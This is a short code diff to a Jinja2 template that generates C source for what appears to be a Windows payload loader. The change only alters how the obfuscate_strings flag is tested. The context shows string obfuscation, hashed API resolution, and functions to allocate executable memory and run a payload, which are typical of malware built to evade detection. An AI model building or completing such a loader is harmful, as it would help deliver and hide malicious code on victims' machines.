@@ -12,7 +12,7 @@
 #include <stdio.h>
 #include <debugapi.h>
 {% endif %}
-{% if obfuscate_strings == 'true' %}
+{% if obfuscate_strings  %}
 #define OBFUSCATION_KEY {{ obfuscation_key }}
 {% endif %}
 
@@ -29,7 +29,7 @@ char debug_buffer[512];
 {% endif %}
 
 // --- DYNAMICALLY INCLUDE PARTIALS ---
-{% if obfuscate_strings == 'true' %}
+{% if obfuscate_strings %}
     {% include 'partials/deobfuscate_string.c.j2' %}
 {% endif %}
 {% if api_resolver == 'hashed' %}
@@ -55,7 +55,7 @@ BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize);
 void* AllocateExecutableMemory(SIZE_T size);
 void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload_len);
 void ResolveAPIs();
-{% if obfuscate_strings == 'true' %}
+{% if obfuscate_strings %}
 void DeobfuscateString(unsigned char* data, size_t len);
 {% endif %}
 
